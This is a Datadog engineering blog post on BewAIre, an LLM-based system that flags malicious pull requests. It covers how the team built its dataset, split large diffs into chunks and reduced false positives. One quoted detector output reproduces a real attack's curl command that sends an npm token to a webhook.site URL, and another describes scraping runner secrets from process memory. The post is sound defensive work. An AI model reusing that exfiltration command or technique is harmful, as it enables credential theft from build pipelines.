---
schema_version: "1.0.0"
document_id: "54f85c3ca022cb16a79273cfc60ea88d73239190bd1d9db17132abd10e321049"
company_key: "datadog-inc-class-a-common-stock"
company: "Datadog Inc."
source_id: "datadog-inc-class-a-common-stock-rss-a5f59b9b4ce5"
canonical_url: "https://www.datadoghq.com/blog/engineering/malicious-pull-requests/"
published_at: "2025-10-21T00:00:00+00:00"
first_seen_at: "2026-07-20T03:32:32.081856+00:00"
fetched_at: "2026-07-28T20:55:41.466450+00:00"
content_hash: "sha256:76dba1ffb6731e7fba4e0f1b86b33683fb85c6197c4a072b843e810a46c55fb5"
---

# Detecting malicious pull requests at scale with LLMs

Callan Lamb


Christoph Hamsen


Julien Doutre


Jason Foral


Kassen Qian


At Datadog, we’ve embraced coding assistants because they help us ship features faster, cut down on repetitive work like dependency upgrades, and make prototyping less painful. Coding assistants are no longer novelties—they’ve become a critical part of our daily workflows.


These tools also increase the volume of code being pushed every day. Datadog currently sees nearly 10,000 pull requests (PRs) a week across our internal and external repositories, and this number is growing rapidly as AI-assisted development scales.


For our security teams, this creates two big problems:


-


**Growing attack surface:** More PRs means more opportunities for attackers. Subtle code exploits—like those seen in the[Ultralytics hack](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection) ,[tj-actions breach](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction) , and[others](https://github.com/ramimac/wiki/issues/63#issuecomment-2969531142) —can slip through, hidden in encoded payloads, disguised as legitimate dependency updates, or buried deep in workflow configurations.


-


**Reviewer fatigue:** Even with dedicated reviewers, linters, and automated code and dependency scanning, the sheer number of changes can start to feel overwhelming. Anyone who’s dealt with the verbose nature of LLM-generated code knows what we mean.


Traditional static analysis tools are a critical part of the puzzle, helping prevent security and quality regressions at scale—but **they mainly catch known bad patterns** . More importantly, **they don’t understand intent** . Attackers can slip in dangerous capabilities without leaving obvious traces, and legitimate changes—like modifying a namespace’s permissions model—can look indistinguishable from abuse.


Our security teams needed a system that could reason beyond syntax and semantics to detect malicious behavior at the design level. It also needed to work in real time, without slowing developer velocity.


In this post, we’ll share how our SDLC Security team built a large language model (LLM)-powered system that reviews every PR at Datadog in real time for malicious activity. You’ll learn how we:


-


Improved accuracy using prompt engineering and data tuning


-


Worked around model degradation caused by context limits


-


Continuously test our tool against real-world exploits, such as the tj-actions and Nx attacks


Along the way, we’ll share what worked, what didn’t, and what we learned about making LLMs useful for large-scale code security. This system is already running in production across Datadog’s repositories and is[available in Preview](https://www.datadoghq.com/product-preview/malicious-pr-protection/) for Static Code Analysis (SAST) customers.


## An example of malicious code injection


The[tj-actions/changed-files breach](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised#summary-of-the-incident) from earlier this year shows the clever and obfuscatory methods attackers use to bypass normal review systems. The attacker used a compromised personal access token (PAT) used by the` tj-actions-bot` account to push a malicious commit. That commit executed a Python script designed to extract secrets and other sensitive data from the GitHub Action runner’s process memory and print them to build logs.


This attack was particularly dangerous because it exploited several weaknesses common across many review systems:


-


**Exploited GitHub PAT:** The attacker used a valid PAT with write access to inject code into the` index.js` file with a pull request that appeared legitimate.


-


**Obfuscation:** The link to the malicious code gist was obscured via Base64 encoding, as were the printed logs. The commit was also disguised to appear as though it had been authored by` renovate\[bot\]` , giving it an initial veneer of respectability.


-


**Version tag manipulation:** The attacker updated all version tags to point to the malicious commit, enabling the malicious code to spread rapidly throughout the ecosystem.


Even organizations that follow best practices—modern version control, protected branches and tags, two-person reviews—could easily miss this kind of injection. Security teams can require even stricter code review processes, but this comes at the cost of developer velocity and can create friction between teams. Attackers count on this, and they happily lean into the needle-in-the-haystack advantage.


## Using LLMs to detect maliciousness at scale


One of the clearest benefits of LLMs is their ability to process massive amounts of data without ever succumbing to reviewer fatigue. During an internal hackday, we tested whether LLMs could help with security reviews at scale by crafting prompts designed to identify malicious intent in code. The initial results from a hackday’s worth of experimentation were promising enough that we kept going. We built out a system we nicknamed **BewAIre** (lovingly—and confusingly—pronounced “beware”).


BewAIre is an LLM-powered code review system built by and for security teams. It reviews the diff of every PR and classifies the code as **benign** or **malicious** , with a written explanation of why we think the PR is malicious. Here’s how it works:


-


**Ingestion:** We start with PRs merged to the default branch of every internal and external repository.


-


**Preprocessing:** Each PR is normalized so we can extract the diff and enrich it with metadata and contextual clues (author, repository type, and so on).


-


**Inference:** The LLM processes the code changes and contextual metadata, reasoning about the **intent** behind the modification.


-


**Signals:** Each verdict becomes a Datadog security signal, which is fed directly into our internal dashboards. From there, security engineers get paged or alerted, allowing us to investigate in real time.


On a curated dataset of malicious and benign changes, our tool achieved:


-


**>99.3% accuracy** across a representative dataset of hundreds of PRs (with a balanced accuracy of **>93.5%** )


-


**0.03% false positive rate** , thanks to prompt engineering, dataset tuning, and suppression rules for safe patterns


-


**100% detection** of all malicious commits tied to known npm package compromises in our[malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset) , showing it can catch real-world attacks with minimal false positives


Base64-obfuscated payload in the tj-actions attack. Base64-obfuscated payload in the tj-actions attack.


This scanner has been running for months across all PRs opened to Datadog’s internal and open source repositories, allowing us to continually improve the tooling for accuracy and for cost.


## How we built and tuned the tool


For a tool embedded in daily development running at scale, **accuracy must be high** and the **false positive rate extremely low** to prevent needless noise. To get there, we focused on three key areas: curating data, handling context windows, and reducing false positives.


## Curating a dataset


Unlike classic application-level vulnerabilities—where datasets like[BenchmarkJava](https://github.com/OWASP-Benchmark/BenchmarkJava) and[Damn Vulnerable Web Application](https://github.com/digininja/DVWA) already exist—there’s no ready-made repository of malicious PRs, so we built one ourselves. Over several months, we hand-labeled and assembled:


-


**Real-world malicious exploits** observed in the wild and in open source ecosystems, grounding the dataset in actual attacker behavior.


-


**Simulated attacks** crafted by hand and with LLMs to mimic hard-to-detect behaviors such as credential exfiltration, CI job modifications, and subtle permission escalations.


-


**Benign PRs** from Datadog’s internal and open source repositories, including everything from simple bug fixes to large-scale refactors—even cases that look risky at first glance but are safe.


We update this dataset weekly with new examples, which allows us to:


-


Improve accuracy while optimizing for model performance and cost


-


Stress test newly released state-of-the-art (SOTA) models to see their impact on evaluations and test their ability to fool our systems


-


Validate the system’s ability to detect novel forms of malicious behavior, ensuring it evolves alongside real-world threats


### Working with context windows


Context windows have increased significantly in the past year, but they’re still not large enough for massive PR diffs like those found in large-scale dependency upgrades or refactors. These large PRs are a well-known attack vector, often used to sneak malicious changes into hundreds of thousands (or even millions) of lines of otherwise innocuous code.


Our initial tests were accurate with small code samples, but we quickly found that large-scale changes led to a degradation of evaluation quality. To resolve this, we took inspiration from classic static analysis, recursively breaking large diffs into smaller chunks and evaluating each chunk sequentially.


To avoid breaking code at random points, we prioritize chunk boundaries in the following order:


-


**Before the next file marker** (` \\ndiff --git` )


-


**At the previous newline** (` \\n` )


-


**In the middle** , as a fallback


Once the chunks are evaluated, we need to combine the LLM responses into a single answer. We give preference to the most severe classification and string concatenating reasons. For example, a PR with a large diff might be broken into seven chunks: six marked benign, and one flagged as malicious:


Recursive chunking of large PR diffs to isolate malicious code. Recursive chunking of large PR diffs to isolate malicious code.


The system rolls that up into an overall **malicious** verdict, along with the reasoning and heuristics used, as shown below in a Slack alert sent to our team:


Slack alert showing a flagged malicious pull request and triage guidance. Slack alert showing a flagged malicious pull request and triage guidance.


As the recursive approach is similar to walking a binary tree, the number of prompt renderings (nodes) and LLM requests (leaves) scales to somewhat exponential in the height of the tree. This can lead to significant durations to assess the entire large diff. Consequently, we’ve kept timeouts high and break diffs at a certain depth and number of chunks to avoid infinite recursion.


### Reducing false positives


For any code scanning or security tool, false positives are the enemy. Developers won’t tolerate noisy alerts, and security engineers won’t respond quickly if most of what the tool flags turns out to be nothing. The LLM who cried wolf helps no one.


In our early prototypes—built fast, with little data curation—we saw an unsustainable false positive rate of over 10%. Over the next six months, we drove that number down to **below 0.03%** by focusing on five areas:


-


**Prompt engineering and pattern exclusion:** We documented known false positives in the system instructions, steering the model away from recurring misclassifications. We also excluded safe patterns, such as demo environments and TLS tests in harnesses.


-


**Data curation:** Our test-validate-label flow added hundreds of PRs to the data set, steadily increasing context. Each month, we add new attack variations and fresh false positives to refine the data model and improve the user experience.


-


**Inference testing across models:** We test regularly against new SOTA LLMs to determine whether newer models improve accuracy and whether they can be tricked by newly generated exploits.


-


**Balanced accuracy as a metric:** Because benign PRs vastly outnumber malicious ones, we measure results with[balanced accuracy](https://en.wikipedia.org/wiki/Precision_and_recall#Imbalanced_data) to avoid biasing our evaluations against the majority class.


-


**Manual validation and red teaming:** After achieving consistent performance, we ran the tool in shadow mode for several months across Datadog’s internal and public repositories. Security teams triaged each alert as a true or false positive, and we used this data to adjust our prompt and steadily improve our accuracy over time. Our pentesting and adversary simulation teams also red-teamed the tool, trying to fool it with prompt injections and deception attacks, giving us simulated-yet-realistic samples of how the system performed under stress so we could better handle edge cases.


## How it performs IRL


The result is a system that not only works in theory but also scales across the thousands of PRs we process at Datadog every week. It runs quietly in the background, but when something looks off, it flags it for our security teams in real time.


For example, here’s BewAIre’s response to the malicious commit used in the tj-actions attack:


```text
1   BewAIre analysis for commit f0d342d24037bb11d26b9bd8496e0808ba32e9ec:    2   Verdict: malicious    3   Reason: The commit introduces a malicious payload that steals secrets from GitHub Actions runners. It contains a base64-encoded Python script that locates the GitHub Runner. Worker process, reads its memory space via /proc/{pid}/mem, and extracts values marked as secrets. The extracted data is then echoed to output where it could be exfiltrated. Additional red flags include:    4
5   (1) misleading commit message.    6
7   (2) unsigned commit.    8
9   (3) obfuscation through base64 encoding. This is a sophisticated attack designed to steal GitHub secrets from any repository using this widely used action.
```


Similarly, the response from the recent s1ngularity exploit:


```text
1   BewAIre analysis for commit 3905475cfd0e0ea670e20c6a9eaeb768169dc33d:    2   Verdict: malicious    3   Reason: This commit contains clear signs of a malicious attack attempting to exfiltrate sensitive credentials. Key indicators:    4
5   1. The commit modifies a JavaScript file involved in the publishing process to extract the NPM_TOKEN (NODE_AUTH_TOKEN) environment variable and send it to an external webhook.site URL using curl.    6
7   2. The code explicitly uses `curl -d "${npmToken}" https://webhook.site/59b25209-bb18-4beb-a762-38a0717f9dcf` to send the token to an external service not affiliated with Nx/nrwl.    8
9   3. The commit includes `core.setFailed("Stall");` to deliberately break the workflow after stealing the token.    10
11   4. The commit author "StrikeOmega0788" appears to be an external contributor (not found in GitHub currently).    12
13   5. The commit message "[skip ci] Update publish-resolve-data.js" attempts to bypass CI checks while modifying a sensitive publishing script.    14
15   This is a classic example of a supply chain attack targeting the build/publish process to steal authentication tokens that could be used to publish malicious packages under the organization's name.
```


These were real-world attacks that had wide-ranging impacts that took days or even weeks to unwind for the impacted organizations. Using LLMs to catch these attacks at the commit level provides us with a powerful tool that wasn’t possible in previous generations of security tooling.


## Lessons learned


Building BewAIre taught us broader lessons about building and operating LLM-powered security systems at scale:


-


**LLMs expand detection coverage:** These tools enable detection of intent-based attacks that traditional security tooling struggles with.


-


**Prompt engineering matters:** Carefully framing context, exclusions, and known pitfalls drastically improved reliability. We saw double-digit accuracy gains across multiple iterations of the prompt design.


-


**Curated datasets and suppression rules are critical:** Our team spent months improving accuracy through careful creation and curation of malicious data and system-level prompts. These were incremental improvements and represented much of the day-to-day work of improving this system.


-


**Chasing benchmarks leads to diminishing returns:** Although we continue to test against SOTA models, most of our real improvements have come from better prompts and better data. Changing across SOTA models ends up being most interesting for cost optimization.


-


**Dogfooding accelerates tuning:** Using the tool on Datadog’s own codebase gave us realistic data and quick feedback cycles.


-


**Testing must be adversarial:** Only by simulating real attacker behavior could we measure true malicious-detection performance.


-


**Automation is essential:** As coding assistants proliferate, security teams cannot scale manual review capacity. Automated, intent-aware systems are the way forward.


LLMs aren’t just a research curiosity—they’re a practical defense layer against a class of attacks that used to be nearly invisible.


## How LLMs fit into our evolving security posture


Scanning code at scale is notoriously difficult to get right. As the tj-actions attack showed, even organizations that adhere to best practices—version control, protected tags and branches, requiring two-person reviews—can still be tricked by clever code injection. At the same time, coding assistants and LLM-powered development are shifting the bottleneck in software from writing code to **reviewing it safely** .


At Datadog, we believe the future of code security isn’t just about more scanning—it’s about **smarter** scanning. We need systems that understand intent, adapt to emerging attacker behaviors, and integrate seamlessly into developer workflows. BewAIre is a step toward that future.


LLM-powered detection fits well with our existing[Static Code Analysis](https://docs.datadoghq.com/security/code_security/static_analysis/) (SAST) and[Software Composition Analysis](https://docs.datadoghq.com/security/code_security/software_composition_analysis/) (SCA) tools. These methods help us catch new classes of threats while continuing to rely on battle-tested tools that scan for known vulnerabilities. By combining LLM reasoning with Datadog’s security telemetry and triage workflows, we’ve shown that detecting malicious PRs at scale is not only possible—it’s practical.


After validating the system internally, we’ve made malicious pull request detection[available in Preview](https://www.datadoghq.com/product-preview/malicious-pr-protection/) for Datadog Static Code Analysis (SAST) customers. Next, we plan to expand coverage to other markers of insecure code, such as personally identifiable information (PII), and explore agentic approaches for gaining deeper context on code changes.


If tackling challenges like malicious PR detection sounds like your kind of work, we’d love to hear from you.[We’re hiring!](https://careers.datadoghq.com/all-jobs/?s=security&parent_department_Engineering%5B0%5D=Engineering&utm_source=engblog&utm_medium=corpsite&utm_campaign=engcommunity-2025-security-ai&gh_src=hm4uekgj1us)


-
-
-
